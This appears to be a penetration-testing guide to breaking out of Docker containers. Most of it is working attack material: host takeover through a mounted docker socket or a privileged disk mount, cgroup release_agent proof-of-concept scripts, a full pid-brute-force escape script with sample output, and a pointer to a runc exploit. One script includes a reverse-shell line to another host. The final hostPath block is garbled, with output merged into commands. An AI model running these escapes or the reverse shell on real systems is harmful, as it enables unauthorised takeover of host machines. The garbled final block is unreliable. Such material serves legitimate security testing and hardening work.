# Docker Breakout / Privilege Escalation

## Automatic Enumeration & Escape

* ****[**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
* ****[**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
* ****[**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
* ****[**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers

## Mounted docker socket

If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.

```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

In this case you can use regular docker commands to communicate with the docker daemon:

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

{% hint style="info" %}
In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
{% endhint %}

## Container Capabilities

You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

You can check currently container capabilities using previously mentioned automatic tools or:

```bash
capsh --print
```

In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:

{% content-ref url="../linux-capabilities.md" %}
[linux-capabilities.md](../linux-capabilities.md)
{% endcontent-ref %}

## `--privileged` flag

#### Escape mounting the disk in the container

Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

So to take over the host machine, it is trivial:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola `folder.

#### Other escapes without mounting the host filesystem

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Second PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.

In fact, `--privileged` provides far more permissions than needed to escape a docker container via this method. In reality, the “only” requirements are:

1. We must be running as root inside the container
2. The container must be run with the `SYS_ADMIN` Linux capability
3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
4. The cgroup v1 virtual filesystem must be mounted read-write inside the container

The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.

Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.

A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

### Breaking down the proof of concept

Now that we understand the requirements to use this technique and have refined the proof of concept exploit, let’s walk through it line-by-line to demonstrate how it works.

To trigger this exploit we need a cgroup where we can create a `release_agent` file and trigger `release_agent` invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.

To do that, we create a `/tmp/cgrp` directory, mount the [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.

If you’re following along and get “mount: /tmp/cgrp: special device cgroup does not exist”, it’s because your setup doesn’t have the RDMA cgroup controller. Change `rdma` to `memory` to fix it. We’re using RDMA because the original PoC was only designed to work with it.

Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.

We can see the “x” child cgroup creation and its directory listing below.

```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```

Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its `notify_on_release` file. We also set the RDMA cgroup release agent to execute a `/cmd` script — which we will later create in the container — by writing the `/cmd` script path on the host to the `release_agent` file. To do it, we’ll grab the container’s path on the host from the `/etc/mtab` file.

The files we add or modify in the container are present on the host, and it is possible to modify them from both worlds: the path in the container and their path on the host.

Those operations can be seen below:

```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Note the path to the `/cmd` script, which we are going to create on the host:

```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```

Now, we create the `/cmd` script such that it will execute the `ps aux` command and save its output into `/output` on the container by specifying the full path of the output file on the host. At the end, we also print the `/cmd` script to see its contents:

```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```

Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a `/bin/sh` process and writing its PID to the `cgroup.procs` file in “x” child cgroup directory, the script on the host will execute after `/bin/sh` exits. The output of `ps aux` performed on the host is then saved to the `/output` file inside the container:

```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```

## `--privileged` flag v2

The previous PoCs work fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example `overlayfs`, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.

#### Kata Containers

```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```

[Kata Containers](https://katacontainers.io) by default mounts the root fs of a container over `9pfs`. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.

#### Device Mapper

```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```

I saw a container with this root mount in a live environment, I believe the container was running with a specific `devicemapper` storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.

#### An Alternative PoC

Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.

The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.

The Linux `/proc` pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the `/proc` directory of the process on the host:Container

```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```

_As an aside, the `/proc/<pid>/root` data structure is one that confused me for a very long time, I could never understand why having a symbolic link to `/` was useful, until I read the actual definition in the man pages:_

> /proc/\[pid]/root
>
> UNIX and Linux support the idea of a per-process root of the filesystem, set by the chroot(2) system call. This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/\*.
>
> Note however that this file is not merely a symbolic link. It provides the same view of the filesystem (including namespaces and the set of per-process mounts) as the process itself.

The `/proc/<pid>/root` symbolic link can be used as a host relative path to any file within a container:Container

```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```

This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of _any_ process running in the container.

#### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The `init` process is assigned process id `1` and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:Container

```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

Host

```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```

#### Putting it All Together <a href="putting-it-all-together" id="putting-it-all-together"></a>

To complete this attack the brute force technique can be used to guess the pid for the path `/proc/<pid>/root/payload.sh`, with each iteration writing the guessed pid path to the cgroups `release_agent` file, triggering the `release_agent`, and seeing if an output file is created.

The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this _should_ not cause reliability issues, but don’t quote me on that.

The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups `release_agent` functionality:

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```

Executing the PoC within a privileged container should provide output similar to:

```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```

###

### Runc exploit (CVE-2019-5736)

In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.

Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:

`docker exec -it <container-name> /bin/sh`

This will trigger the payload which is present in the main.go file.

For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
There are other CVEs the container can be vulnerable too
{% endhint %}

### Writable hostPath Mount

(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:

```bash
#### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

#### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

#### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
